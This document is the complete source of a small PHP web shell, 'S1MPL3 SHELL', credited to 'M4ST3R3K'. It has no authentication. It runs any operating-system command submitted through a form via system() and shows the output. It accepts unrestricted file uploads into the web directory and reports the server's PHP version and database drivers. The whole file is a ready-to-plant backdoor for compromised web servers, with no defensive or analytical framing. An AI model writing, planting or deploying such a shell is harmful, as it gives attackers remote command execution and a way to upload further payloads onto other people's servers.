<?php

//S1MPL3 SHELL by M4ST3R3K //


//GET OS COMMAND
$cmd = $_POST["cmd"];

//GET DRIVER DB
$driver = $_REQUEST["driver"];

foreach (PDO::getAvailableDrivers() as $driver) {
}


//UPLOAD FILES
$target_dir = "";
$target_file = $target_dir . basename($_FILES["arc"]["name"]);
	

if (isset($_POST["bt"])) {

	$partname = explode(".", $_FILES["arc"] ["name"]);
	$n = $partname[0];
	$t = $partname[1];

	//teste
	//echo "$partname[0]";
	//echo "</br>";
	//echo "$partname[1]";

	$numtest = 0;
	$ntest = $n;
	
	while (file_exists("$ntest.$t")) {
		$ntest = $n.'_'.$numtest;
		$numtest++;
	}	

	$target_file_2 = $target_dir . $ntest.'.'.$t;

	if (move_uploaded_file($_FILES["arc"]["tmp_name"], $target_file_2)) {

		$fname = $_FILES ["arc"] ["name"];
		//echo "</br>";
		$fsize = $_FILES ["arc"] ["size"] . 'bytes';
		//echo "</br>";
		$success = 'Upload  success'; 

	} else {

		$fail = 'Fail';

	}

}

?>


<html>
<head>
<style>

input[type=text] {
width: 50%;
padding: 2px 100px;
margin: 8px 0;
box-sizing: border-box;
}

textarea{
width: 100%;
height: 150px;
padding: 12px 20px;
box-sizing: border-box;
border-radius: 4px;
font-size: 16px;
resize: none;
}

input[type=button], input[type=submit]{
border:none;
color: white;
padding 16px 32px;
text-decoration: none;
margin: 4px 2px;
cursor: pointer; 
}

</style>
</head>
<body>

<div align="center" style = "font-size:20px; color #f00; font-family:arial;">
S1MPL3 SHELL </div><br/>
<div align="right" style = "font-size:10px; color #f00; font-family:arial;">
by M4ST3R3K </div><br/>
<div align="left" style = "font-size:12px; color #f00; font-family:arial;">
PHP Server: <?php echo phpversion()?> <br/> DB Server: <?php echo $driver?></div><br/>

<form action="" method=POST>
<label for"cmd">OS COMMAND:</label>
<input type="text" id="cmd" name="cmd">
<input type="submit" value="Run">
</form>


<form>
<textarea disabled><?php if ((system($cmd, $result) == true || $cmd == "")) {  echo system($result);}else {echo "Invalid command or user dont have permission";} ?></textarea>
</form>



<form action="" method="POST" enctype="multipart/form-data">
<label for "upload">Upload File:</label>
<input type="file" name="arc">
 <input type="submit" value="Upload" name="bt">
</form>

<div align="left" style = "font-size:12px; color #f00; font-family:arial;">
<?php echo $fname;?> <br/> <?php echo $fsize;?> <br/> <?php echo $success;?> </div><br/>

